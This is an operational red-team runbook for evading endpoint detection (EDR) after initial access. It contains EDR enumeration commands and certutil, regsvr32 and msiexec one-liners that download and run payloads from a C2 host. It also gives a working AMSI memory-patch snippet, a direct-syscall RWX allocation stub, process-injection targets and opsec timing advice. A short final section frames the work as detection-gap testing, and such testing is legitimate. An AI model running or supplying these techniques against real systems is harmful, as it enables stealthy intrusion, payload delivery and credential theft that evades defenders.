# Runbook: EDR bypass

## Objective

Execute post-exploitation operations without triggering EDR detection. This runbook covers the techniques used after initial access to maintain stealth during credential harvesting, lateral movement preparation, and tool execution.

## Identify the EDR

Before attempting any bypass, confirm what is running:

```powershell
# Enumerate security-related services
Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName

# Check for EDR driver names
fltMC | findstr -i "sensor guard protect defend"

# Named pipes associated with common EDR products
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String "crowd|sentinel|cylance|defender|carbon"
```

The EDR product determines which bypass techniques are relevant. CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint, Carbon Black, and Cortex XDR each have different detection logic and different bypass landscapes.

## LOLBin execution

Execute code through signed Microsoft binaries to avoid hash-based and unsigned-binary detection:

```powershell
# Download and execute via certutil (still works against weaker EDR)
certutil -urlcache -split -f https://c2/payload.exe C:\Windows\Temp\p.exe

# Execute a COM scriptlet via regsvr32 (often flagged now, test first)
regsvr32 /s /n /u /i:https://c2/payload.sct scrobj.dll

# msiexec silent install from URL
msiexec /q /i https://c2/payload.msi
```

Check the LOLBAS project for the current state of each binary's detection rate before use. Many are now signatured.

## AMSI bypass

Before executing any PowerShell payload, patch AMSI in the current process to prevent script block scanning:

```powershell
# Patch AmsiScanBuffer to return clean result (encode or obfuscate for transport)
$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};
$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};
$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

AMSI bypass must precede any PowerShell-based tool execution including SharpHound, Seatbelt, and in-memory .NET assembly loading.

## Direct syscall execution

Use SysWhispers3 or Hell's Gate generated stubs to call NT APIs without going through ntdll.dll hooks:

```c
// SysWhispers3-generated stub example
NtAllocateVirtualMemory(
    (HANDLE)-1,
    &baseAddress,
    0,
    &regionSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);
```

Integrate direct syscall stubs into C2 agent builds to bypass userland hooks on all memory allocation and injection calls.

## Process injection into legitimate processes

Inject into a long-lived, trusted process to blend subsequent activity:

```csharp
// Using OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
// Target: a process with network access that is expected to be running
// Good targets: explorer.exe, svchost.exe, a browser process

// Prefer APC injection or module stomping over CreateRemoteThread
// to avoid the CreateRemoteThread detection signature
```

Cobalt Strike's `inject` and `shinject` commands, Sliver's `migrate`, and manual Donut-generated shellcode loaded via execute-assembly all support this.

## Timing and operational security

Space operations across time to avoid behavioural correlation:

- Do not run enumeration, credential harvesting, and lateral movement in the same five-minute window.
- Operate during the target's working hours when process activity is highest and individual actions are less anomalous.
- Use `sleep` with jitter between C2 callbacks to avoid beaconing detection. A 30-minute interval with 50% jitter is a reasonable starting point.
- Clean up artefacts (staged files, temporary directories, modified registry keys) after each phase.

## Testing detection logic

The objective of EDR bypass testing is not just to avoid detection but to document what the EDR did and did not flag. Run each technique and check the EDR console for alerts before proceeding. A technique that is undetected is evidence of a detection gap; a technique that triggers an alert confirms the EDR is functioning but also identifies the specific signal that caused detection, which informs refining the approach.
